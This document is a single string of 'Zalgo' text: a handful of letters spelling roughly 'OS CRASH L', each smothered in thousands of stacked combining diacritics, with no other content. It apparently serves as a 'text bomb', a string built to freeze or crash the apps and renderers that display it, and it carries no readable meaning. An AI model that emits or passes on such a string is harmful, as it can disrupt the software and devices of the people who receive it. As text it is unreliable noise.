̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅͘̚̚͘͜͜͜͜͜͜͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ ̵̨̧̡̧̧̨̢̢̡̨̡̧̢̢̨̨̧̢͖̦͕̹̮̬̹͇̰̺̹̺͇͕̣̦̥̙̤͓̤̥̳͚͙̘͖̙̣̩͇̻̗̹͓̹͈̲̙̘̗͓͈͎̘̝̻̘͇̦͇̘͎̤̰̣̠͚̩̼͇̪̤̺̣͉̱͓͍̮̖̘͍̜̣͈̺̠͇͉̳̙̩̟͎̻̜̗̳̭͚̹̭͔̣͓̻̭̝̞̬̪̯̺̣̱̥͎͖̪̦̙̟̥̦̟̭͓͙̲̼̲̣̹̜̪͍̙͚͕͙̩͙͎̣͉̲͍̘̻̟͚͈̖̣̼̟̺̟̲̳̺͇͖͕͍͚͙̭͉̬̠̹̺͍̖͕̼͙̞̲̼͍̲̣̘̫̲̭͖͑̏̈́̃̈́͋̿͋̀͊͛͛̎̏̀̊̊̇̒̈͊͆̇̄̾̽̾͒̋̓͛̾̈́̎̚̚̚͜͜͠͝͠ͅͅͅͅͅͅᆞ̴̢̨̨̧̢̨̨̢̡̢̢̨̨̡̨̡̧̧̧̧̡̨̨̢̢̡̧̧̢̞̟̪̪͉̺̥͓̪̦̲̖̼͍̲̳̬͈̲̬̹̖̩̗͕̠̻̪̦̞͇̭̮͇̲̗̥̟̣̠͍̭̟̥͍̗̘̼̮̫̹̲̼̬͇͈͚̤̺͎̭͓͈̯̗̮͉̲̩̘̙̗̱͍̳̖͇̠̯͔̺͍̫̼͖͓̥̫͔̗̩̻̪̼̝͚̠̼̺̰͉͍̠̭̬̞̻͙̠̞̹̪̫̝̼̺̻͚̲̣͓͚̜̤͇̯͖̼͍̣̻̹̯̱͔̰̪̻̤̭̟̥̥̥̭̹̲͖̲̖̞͍̘̭͙͈̠͈͉̗̲͇̣̰̯̣͍̗̼̦̱̠̞̘̪̺̙̖͉̗̻̹̟̪̯͔̰̺̳̞̗͕̻̞̯̭̤̙̬̥͙̣̼͓̳͎̩̙̻͓͈̭̘̯̪̖͕̜͖̯͎̼̟̻̦͔̮̫̣̯͈̼̦̯̳̮̘͎̤̬̝͖̀͌͐̄̓́̈̀͑͆̆͘͜͜͜͜͜ͅͅͅͅͅͅͅC̷̡̨̨̨̧̧̧̨̧̨̢̢̢̢̡̡̢̡̨̨̧̡̢̢̢̡̧̧̧̡̛̛̲̜̜͚͉͔̟̮̜̖̖͎͓̥̥̼̦̲̭̹͖̤̪̖͉͔̣̳̻͇̬͕͈͓̳̖̣͓̙̺̣͖̝̯͈̥̯̳͔̝̞̝͓̫̬͇͔͎̥̥̗̝̞̮̖̞̱̰̣̣͚͈̩̣̜̥̳̫̬̰̱̙͎͕͔̤̟̻͈̩̝͔̥͎̦͎̫̲̪̦̭̟̘̤͓̟̪̥̬̟̜͍̠̲̫̹͓͍̙̯̱̜̗͍͇͖̪̱̮̳̫͍̘̯̪̼͚̭̣̠͉̤̞̙͓͉̥̙̝̗̙̠̺̜̞̤̻̳̦̣̰̼͈̫̗̝͉͔͈̳̝̪̪̼̼̫͍̖̣̹̠̟̟̫̰͓̺̱̖̲̖̘̙͔̝͙̫͕͎̪̳̰̥̟̘̮̲̜̼̜̰̹̬̼̰̐̿̿̆̀͋̌̆̌̒̃͆͒̆͒́͆̈́̓͒͊̿͌̔̎͗͋̍̏̐͆̈́͐̓͊̄̈͌̽͛̔̒͌͌̋͌̈́́̀̄̇͋̈́̀͌̇͒̍͌͐̍̍͂͋͒̔̄̾͆̌̇́͛͌͑́̀͗̎͒̐̾̿͊̔̒̐͗͋̏͒̈̈͋̈̔́̓̒͆̒͒͐̓̀́͂̓̈́͆̈͘͘̚̚̕̚̕̚̕̚̕̚̕͜͜͜͜͝͠͝͝͝͝͝͝͝ͅͅͅͅᆞ̵̡̧̛̭̹̝͖̩̫͓̝̖̰̲̙̮̟̟̞̮̙͉͓͕̐̽͛̈́̓̇͗̎͒̓̇̃͛͛͗͛̍̐͗͗̏̓͛̐̈́̍͂̈͂͛̔̍̾͆͒̿̈̽͐̌̂̚̚͘͘͘̚͘͜͠͝͝͝͠͠͠ᆞ̶̡̧̨̢̨̢̢̡̢̢̡̧̨̢̢̡̡̨̢̡̨̨̧̛̛̹̯̰̪͖̺̞̮̣̯̺̦̯̜̱͓̭̜̥͈̳͎̖̜̝̤̯̟͓̬̮̝̠͓̼̬̻͉̙̲̻͕͕̠̝̞͈̤̥͉̗͎̹̜̺͇̱͙̬̦̙̗͖̩̪̝̖̘̥̮̜̜͕̫̙͚̫͕̭̼͈̩̦͎̬̗̬̘̤͓͇̺̜̤̩̼͍̣̦̳͎̬̦̤̱͍͙̭͉̖̣̳̖̣͈͙̗̝͓̤͈͔̹͈̰̜̼̼̤̟̰̻̦̘̥͕͙̤̙͕͍̭̘̘͕̞̘͉̟̻̠̭͓̺͖̩̭̬̪̦̪̝̤͉̜̥̮͍͕̥̪̣̼̼̜̥̱̟̪͇̹͍̪̖͇̭̥̝̤͇͉̯̬̦͓̜͎̝̭͇̱̰̰̼̰̼̥̜̮̰̯͕͉̣̣̠͙̠̖̻̩̙͎̙͖̜̺͙̫̯͎̱̄͗̌̅͗̒̒̾́̇͛̄̆̃̎͑̈́̅̐̿̎̃̅̒̂͂̀͗̌̓́́̇̆͂͊̒̀̊̍̑͑̍̓͊͗̿̀̂̃͊͋̃̑͒͂̾̌͒͊̎̀̑̑̀̓̓͆͛͗̉̓̄̏̂̐̍̉̋̉̎̇͐́̃̽́̅̋̑̓̃̄̌̑͗̓̔̀̾̾̋̔̄̐̔͐͂̀̔̒̈̎́̈́́̂̀̀̓͂̏̃̋͑̆̃̃̀̃̽͐̔̆̽̈͊͒̍͐̽̾̾̇̍͂͐͑͒͊͋͐͗̈̍͒̿̽̔̔̋͆̐̿̀̽̒͂͛̈̅̍̿͗͂͊̀͐̍̓̌̓͌̎̅́͂̎̔̇͂̚̚̚̕͘̚̕̕̕̕̕̚̕̕͘̚̚̚̚͜͜͜͜͠͠͝͠͝͝͝͠͝͝͠͝ͅͅͅͅͅR̴̡̧̨̢̨̡̧̡̛̛͓̘͓̻͓͇̥̠͚̻̰̩͕̞̲͔͔͔̳̪̩̯͎̜̭͕͚̦̖̤̞͍̯͇̪͓̼̭͈̗͉̗̞͈̫̖̙̥͍̤͙͓͉͇͉͈̩̈́̿͋͌̎̉̍́̉͋̾̉͑̏̋̓͌̐͜͝͝ᆞ̶̧̧̡̨̡̡̨̢̨̧̨̡̧̡̨̛̛̟̤̣̘̤͎̤͕̟̙͎̩̭̝͔͇̰̝̬̘̣̹̝̯̥̭̯̝̲̺̤͔̬̟͇̲͍̣̮͔̞͓̘̱̝͕̼̰̳̤͚̙̰̬̭͎͇̬̹̖̹̰̦̖̞̟̥͍͔̻͎͍̦͇̪͓̠͙̳͍̙̪̤̭͇̹̝͚̩̹̰̩̠͓͓̙̦̩͔̪̤̜̺͔̜͔͖̖̗̜̣̥̣͎̠͈̙̺̱̗̙̯̤̜̜͍̖̳̟͗̀̈́̐̂̿͂̽͋́̿̋͒̆̽̓͆̀͛͑́̈̾́́̓̊͋̉̎͗̀̒͌̐́̀́̈́̓̉̈̕̕͘͠ͅᆞ̶̡̢̛̛̛̛̛̛̛͕͎̮̭̤̺̪̻̬̬̦̼̻͕͕͉͈̦̖̱̙̺̩͉̙̐̏͌̒̇͗͒̃̌̅̄̽̆̋̿̾̄̆͐͐̋̔̽̔̅̒̍͆͒͂̅͋́̂̋̄̽̅́̇̈̄͋̓̆̋͒́̊͑̾́͆́̾̇̓̉̂͂̃̽̂̋̋͂̃͋̓͋̿͊̾͒̔̂̍͛̆̂̉̽̽͋̂͌̑͑̽̈́̽̒̊̋͗̾̊̍̏̊͛̄̆͋̊̓̏̈́͂̽̋̀͌͂͐̂̏̿̉͗̀͐̒̋͛͋̐̑͂̓̆̄̎̒͑̿̔̉̔̍͑̎̊̓̊̀͂̉͐̈͐̀̄́̆̑̋̽̀͒͗̓̉̊̃̓̄̑̄͂̒̍̂̈̃̈́͆̋̎̍̕̚̕̕̚̕̚͘̚̕̕̚̕̚̕̚͘͘̚͘͘͠͝͝͝͝͠͝͝͝͠͝͝͝͝͠Ą̴̧̢̨̨̨̨̡̢̡̛̛̼̪̮̩͍̯͎̙͚͕̮̹̤͓̳͎̬̱̟̣͉͓͙̤̰̱̮̘̱̥͎̪̖͙̥̣͖̟̠͙̻̼͖̺̙̪̮͔̼̟͓̠̟͖̠̠̮̺̰̙͕̳̩̩̝̥̯̳̺̬̤̯̤̗̻̘̳̹͍̱̙̤͔̺̙͖͚̦̰̻͓̥̗̼͖͖͖̠͎̲̖͉͖̞͇̺̺̙͔̗̜̯̲̙̖͎̥͎̞̬̜̲̤̮̱̤̲̰͔͚͍̬̙̘̱̈́̔̓̀̌̎̉̓̑̊́͊̏̓̔͗̈́̀̒̋̍̂́̈́́̿̍̾̿̋̉͋̈́̉̓̅͐̄͋͒̏́͆̄͐̈́̋͊̒̅̏̓͐͊̑͊̆̓̾̃͒̈͑̽̓̒̈́͋̈́̈́͒͗̽̔́̅̍̐̀̓̅̑͗̅̎́̑͂̾͊́́̎̄͆̐̒̋̿̓͋́͋̆͋̈́̄͑́̈͛͆̒̋̉͋̈͑̐̎́͑̆̂̃̄̽̏͒̉̅͊̆̏̇̽̒̈́̈͋̐̎̎̅͌̽͊̍̑̋́͐̀̀̏͑̆̾̂̍́́̈́͛̐̾̓̒̋̓̍͋̋̈̃̅̊͒̄̈́̀̿͂̅͐́̿̈́̆̌̈̒̊̾̐̆͐̐̍̌͂̓̀̂̾̕̕̕͘͘͘̕̕͘̚̕̚͘̚͘͜͜͝͝͠͝͠͝͠͝͝ͅͅᆞ̸̢̢̡̨̧̨̨̧̛̛̛̛̛̜̞̺̜̘̗̱̣͍̦̤͚͎̼͕̥̙͎̙͍̞͈̖̖̤̞͉͔̖͍̣̤̰̟̗̦̲͓͇̫̬̰̹͔̘͓̹̭̻̘͉̲̮̫͕̰̞̓̒̃̔̌͒̅̋̌̋͌̈́̽͗̑͑̓̍̍̍͆̉̀̈́̇̄͊̀́̌̉̔̃͋͆̄͆̎͒̓̈́͆̂͂̆͋͒̍͆̇͂͛̔̅̎̍̍͆̆͐́̄̀̄̃̿̈̇͒̄͒̈́̎͌̋̔̈́̾̌̓̋͛̋̾́̓͐̓̊͂̽̒̌͒͆̓̀̆̓̈̒̎̊͆̈́́̐̿͂͆̃̆̄̓͋̊͂͛͗̅̅͂̄͗͊͛̾̀̎̓͌̈́̃́̒̿̎̐͐͋̓̈́́̄͐̅̒̂̈́́̑͌̾͌͊͋̇̋́̀̈́̒̿̀̂̌̏̄̽͆̅̀̎̿̌̉̽̍̾̀̓̓̾́̔̊́̀̍͛̎̿͛̉̈̄͆̄̋̿͆̅͂̊̓̽̾̈́̍̿͂̕̕͘̕̚͘̕͘̕̚͘͜͝͝͝͝͝͝͠͠͝͝͝͝͠͝͠͠͝ͅͅͅͅᆞ̸̢̡̡̢̡̡̢̧̡̧̛̛̛̛̛̜̮̱͕͓̥̳̬̼̣͍̞̼̮̺͉̤͈͇̠̦͇͈͓͈̪̘̹̘͎̺̻̘̣̱̟͍͓̦̮͔̹̜̪̲̱̦̮̱̯̺̭͈̩̤͉̜̬͈̠͓̻̲̘̲̬̲͈̝͚͎̳̞̪̪̦̹̫̓̑́̄͆̏̂̆̉̓̑͑̋́͊̽̈́̄͆̓͗̿̐͑͑̎̈́́͊͛̂̑͌̉̓͌̀͂͆̃͆̒̅̊̆͊̄̂͐̈́͌͒̽͊͆͋̅͊͗͌̾̄͐̆̒͊̀͑́̒̄̊͒̒͆̓̽͛̿̐́͐̔̂̆̊͗͌̇̒͐̽̿̆͛̈̈̎́̋̋̇́̒̈̐͛̒̃͋͋̌͋̆̎̀̑̏͂̎̌̈́̌͌̅̓͒̎̏͂́̂͑̅̋̍̌̓̔͗͊͒̓̅͂́̓̀̎̔̏̈́͑͊̎́͊̒̉̀̌̅̾̂̀̍̄̎̑̒̽͛͂̋̈́̊͛̂̉̉̐̂̒͗̆̓́̊̇̂͛̈̀̀̓̓́̎̔̅̇̌̋̕̚̕̚̚̕̚͘̕̕͘̕͜͝͝͝͝͝͠͝͝͠͝͝͝͠͝͠͝ͅŜ̴̡̢̢̧̢̛̞̙͈̭̣̠͇̟͙̩̪̮̯̖̮̠̜̜̘̺̣͉̙͍̯̙̘̟̈͗͑̃͋͋̂̏͊̅̿̀̋͑̓̒̽͑̀̀̔̇̑͆̓́̀͐͒̓̿̄̐͂̉͐̈́̌̄̽̃̿́̕̚̕̚͝͝ͅᆞ̶̨̢̨̡̡̨̧̡̢̡̨̡̨̡̡̨̨̧̧̡̨̨̧̨̧̨̧̛̛̛̮͔̟͍̝̝̗̝̺̮̗̣̩̞͈͚̦̘̜̪̭̙̗͉̲̩̯̗̠̤̹̳̣͉̹̗̘̻͕̜̱̝̜̩̺̖̺͔̟̮̹̥̪̳̗̥̯̫̪͇͎͕͉̼͔̬̮̱͎̠̯̻̮͓͖̭̙̳͓͈͓̗͉̫͚̜̣̗̳̬̮͔͙̣͚̻̠̮͈̮̥͙͚̥̯̰̗͔͕̭̤̥̱̙̩̪̯̫̦̫͉͕̹̼͚̟̱̭̱̯̼͙̞͎̠̠̗͉̝̠̪̼͚̫̪͖͓̞̞͍̙͓̪̗̜̥̘̫̩̦̪̹̦͈͚̼̞͉̼̜̳̤͕̞̲̮̱̗̦̠̙͇̬̘͉̺̲͎̟͓̦̱̣͍͓͚̰̼̤̝͈̭̰̲͓̤̗̞͍̤̺͕̞̫͈̟͍̹̳͎̻̩̺͎̥̞̫̟̜̩̮̤̖̜̟̠͈̯͖̱̙̣͎̜̞̫̹̳̙͍̥̬͙̮̣̗̜̓̓͂̄̌́̈́̈́͌͒̎͂̉͂̈́̀͆̒̎̾̔̂̍̂̃͒̃͛͌̓̓͒̇̄̒̓͑̇͊̔͒̓̑̽̾̑̏́̈́̔͗̅̂͊̾͆͑̎̿̋͛͌̎̀̍̒́́̄͆͌͆́͐̎̌̆̈́̌̇̌͒̈́̋̌͗͋͌͊̀̿̈́͑̈́̋̐̈́̅́̿̑̓̎̍̎̔͊͒̀̀̈́̋̍͑́̿͂͂̇̾́͌͗̈̀́̈́͂͆̽̾̏̏̀̓͊͑̅͘͘̕̕̕̚̕̚͘̚͜͜͜͜͜͜͝͝͠͠͝͝͝ͅͅͅͅͅͅͅͅͅᆞ̵̨̢̧̨̧̡̧̡̢̢̢̧̨̱͍̼͚̞͓̗͖̰̦̥̜͇̣͉̬̞͖̠̮̫̘̮̘̟̗͉͉̬̯͎̖͎̲̘͇̜̟̖̭̟̫̝̝͍̠͉͍̝͎̥̟̹̙̱̼͓͍̠͚̟͚̞̘̳̦̟̞̩͔̘̠̠͕͈̙̖̱͖͇̘̠̣̖̫̻͉̘͎͔͇̻͉̖̤̬̮̜̝̞̭̩̰̱̰̖̲̱̭̞̗̹̞̰̬̖̣͓̙͚̮̠̺͕͈̙̜͖̜̙̤͉̱̦̘͓̭͍̝͈̞̲̞̣̖̟̫̰͎̺̺͚̠͓̫͈͖̤̟̮̱͓̻͙̮͖̰͓̄͐́̓̊̓̅̎̓̓͐̀̾͋̆̋͌̈̀̋̍̈́̏̔́̽́̓̐̅͂̃̐͂̕̚͘̚͜͜͜͜͜͠͠ͅͅͅͅḨ̶̧̢̢̢̡̢̢̢̡̡̡͈͈̪̪̮̹͙̤͍̞͓̘̹̦̼̬͚̗̭̮̳̬̮̪͔͈͓̥̦̦̤͇͎͙͕̱͔̹̭͍͔̭̤͎̬̝͍̳̪̰̤̫͔̰͔̮͚̞̩̯͕͖̙͖̗̭̳̲̟̤͎͎̹͙̣̥̯͓̝̥͕̬̯̫̯̦̙̣͈̤̯̥͉̰̺̲̫̬̖̻͔̝̠̫̙͓͖̣̪̰͙̗̳̦̯͓͍̪̲̺̮͎͔̙͙̯̙̪̟̬̱͓̹̫̩̺̼̭̗̻̣̪̣͙̩̦̲͚̾̓̏̉͆͜͜͜͜͜ͅͅͅͅᆞ̴̧̡̡̢̧̡̨̡̧̢̧̡̨̧̧̢̨̡̧̧̨̢̨̡̨̨̨̧̨̛̛̛̛̯͖͈̱̮̹͈̭͈͇̻̳̼͔͖̝̻̻̜̹̥̭̥̬̪̖̮̱̦̤̺̙̖͔͓̰͍̯̲͙͙̹̙̙͔̩͈̮̗̤̪̰͇͈͍̙̬̰̲̠͔̙͇̫̟̯̦̙͚͖̫̳͖̞̩͖̰̞̦̥̣̟̹̞̩̻̞͉͓̩̜̲̼̻̭̙̼͖̲̘͓̪̘̜̠̟̼̗̮̝̤͉͍̣͎̭̙͔̖͇̙̭͈͕̙̝̩̝͇̩̖̣̖̮̥͓̺̪̙̣̻̭̭̲̘̠̘̝̲͚̬͎͇̰̪̺̩̘̩̪̙̺͓͓̱͔͎̺͚̳̙͇̳̰̞̣͚͔̮͈̙̜̥͕̜͕̱̥͈̣͉̘͙̜͚͔̥̖̤̻̳̣̙̜̖̝̻̠̯̳̝̼̰͉̹̞͉̞̠͕̭͍͖̼͖̰̜͕̩̩͇͖̤̘̩̺̬̜̣͍̪̪͇̻̤̤̦̪͎̟͎͎̙͍͍͚̞̮̞̣͉̑̒͌̀̓̅͌́̈͊̊̃̋̏̈̎͛͋̿̇̌̓͌̉͆̓͐͐́̀̒̉͛̒̀́̎̋̅̆̽̾͗̈́́̎̆̃͆̈̋͗̐̋̑͗̒͊͊́͌̋͂̆̏̈́̍͋̀̆̈̎́̋́͊̂̀͛͆͊̐̍̈́̾̀̓̍͑̽̽̃̋͋̿̂͋̃̍̽͂̒̈́͆̀̀́̈́̏̈̉̋̓̒̂̄̒̑́̊̇̇̈́̏̽͑̿̇̎̋̋̎̽̂̏̀̒̓́̒͛̋̈́̇̃̉̌̒͛̄̈́̏͐̆̀̉̈́̄͋̌̐̆͑̐͑̀̈͗͋̌͒̅̃̈̈́̃͊͆̿̀̈́̍̔̄̑́͊͒̈͂͂̊̑̂̈̅͂̀̌̂̋̏́̇͒͛̌̑̀͊̄́̋̏̃͛͌̂͆̎͊̔̒͛͒̔͆̾̚̚̚̕̕̚̚͘͘̚̚̕͜͜͜͝͝͝͝͠͝͝͝͝͠͝͝͠͝͝͠ͅͅͅͅͅ ̵̡̛̮̤̜̠̮͚̞̖̲̹̺̯͈̮̪̪̳̬͖̹̩̟̲̱̥͇̣̠̠͕̟̗̩͙̺̫̫̝̮͕̯͓̮͈͇͚̰͊̍͌̓̃̊̇̽̐̿̄̅̀̓͋͐̾̽̈́̽̆̿͑͐͊͊́́͒̃̈̇̀̆̅̆̔̿̌̓̈́́͊̆͆̂̓̅͗̈́̾̐̓̇̌͑̂̾̈́̈́̌̑̏̀̉͋̀̈́͋͗̀̚͘̕̕͘͜͠͝͠͝͠͠͝ͅᆞ̵̧̡̨̨̨̨̧̛̛̛̛̛̜͖͔̠̮̰̲̰̳͕̖̤̙̥̹̼͎̪̜͖̟̙̬͕̘̟̠͙͇̩̲̫̠̖̗̦̬̣̺̣̼̪͓̜̰͉͔͉͓̱͇̱̜̭͍͓͙̳̪̫͚̩̤̰͎͇͎̘͎̲̫̯̭̱̻͓̪̲̪̙̮̺̰̘̳͈͙̱̟̬̜̠̬͖̻͈̰͓̰̘͉̖̖̯̲͔̪̯͍̼̩͖̜̙͔͕̞̘͍̗̺͔͇͖̖̖͚̲̘͙̫̀͗͛̈̐͒̎͗̐̀͆̓̎̌̅͗̀͂́̐̽͑̈́͆͋͐̒̈̑͐͐̎̊̉̄̋̈́͋͊̍̌͑͐̇̂̔̓̇̏̈́́̾̾͌̎̐̂́̎̾̈́̾̈́̏͘͘̚͘͘͜͝͠͝͠͠͠ͅͅL̸̨̢̨̧̢̨̧̧̨̧̧̡̡̢̧̧̡̢̹͉̰͇̰̤̲͎͈̩̼̥̙͖̰̳̹̺̺̱̖̞͕͍̠̰̞̞̰̙͚̰̺̪̹̼̥̬̙̪̮͍͈̞̞̩̮͓͈̗̟͉̳̣̟̮̩͈͎̘̠͖̗̟̟͖͓̯̠̺͍͕̳͍̥̥͙͈͓̩̣̤͖̰̖̣̹̹̤̠̩̫͕͖͕͈̝̰͙͍̮̱̟̬̩̦̻̬̜͇͓̜̮̮̗̗͖̬͇̙̞̗͍̘̺͕̥̦̣͕̱̯̝͉̹͍͕̱͉̂́͌̈́̆̓̃͊̏̌̈́̅͒̍̾̐̇̅͂̈́͌̔̂̋̏͗͜͜͝͠͠ͅͅͅͅͅͅᆞ̸̢̡̡̨̨̢̧̨̡̢̡̢̢̢̡̧̧̡̢̡̧̨̨̨̢̡̧̨̨̨̡̨̧̢̧̛̛̛̛̛̛̛̗̩̭̳̩̳̯̭̪̬̜̙̟̱͉̹̲̖̰͍̮̩͍̰̘͙̟̬̞̳͔̘̜̞̗͉̪͖͈̳̩͈̞̮̱͖̫̜͇͕͎̜̱͙̠̖͚̝̤͚̱͈̳̺͓̲̻̞͙̟̻̩͓͚̩̖̰̟̟̲̩͔̱̗̼͉̻͇̣̫̪͓͖͖͈̝͔̟̺͙͓̗̗̝̻̣͓͎͉̬̯͎̤͕̬͖̳̺̮͍͇̲̪̮̠̻͚͖̪̯̲͉̜̩͍̥̻̫͖̦̝̥̤̤̖̼̥̙͖̺͓̤͔̦̝̱̰̜̱͖͖̮͈͕̻̳͔̻̙̱͕̰͇̹̗͚̼͚̭̖̭̻͚͓̣̤̖̪̤̺̪͎͇̤͖̤̪͈̗͍̪̭͎̪̰̜͇͚̭͔̼̰̩̞̳̼̱̙̣̮͔̬͇͚̼̝̖͇̟̳̥͚̗̞̘͋̏̉̈́̐͊̌̌̔͐̓̅̆͑̉̒̄̀̊̈́̈́̐̇͗̅̈́̑͊̇̊͌̆̈́̀̇̔̿͑̆͌͑̄͆̃̅͌͊̾̉̅͌̍́̋͊̎̋͋̋͊͗̀̊̾̉̈̅̇̅̿̔̍̽̒̽̍̌͐͊́̑̒̄͗̑̑̿̈̏̊̀͐̄͂͆͋͑̄͌͆̃̇̽̐̍̌̈́̂̈́̌̽̈́̿́̇̀̌̅͂̿̒̊̂͛̐́͑̄͋͑͊̍̌̂̋̐͂̑̄̎̊̃̍̇̎̔̉͒̚̕͘̚̕̚̕͘͘̕̚͘̕͜͜͜͜͜͠͝͠͠͝͝͠͠ͅͅͅͅͅᆞ̷̛̛̛̛̏̂̓́͑͐̄̌́̄̓̾̇͗̊͆̏̆̈͗̎̎͌̓̀͒́̽̑̍̂́́̎͂̓́̂͒̂̄̑̒̿́͋̅̏̋̌̐͌̊̑̐̎̀̀́͊̌̑̂́̅̒̔̆͆̍͒͋́̀̊̌͌̍̇͂͌̅͛̽̒̓̏̋̌̌̾̇͆̆͌͂́̑͆̐̋̇̇̿̏͛̀̓͛̈́̀̈́̈̈̀͑̀͂̈́̏̒̓͋̋̉̿̈̇̊̒͗̀͐̇̑͛͆͐̔̒͐̍̋̀̍̃́̓̓̐̌͋̎̽͒̔͛͆͛̉̅̓͋̃̆̆́̅̍̀̈́͌͘͘͘̕̕͘̚͠͝͠͝͝͠͠͠͝͝͠͝͝͝͠͝͝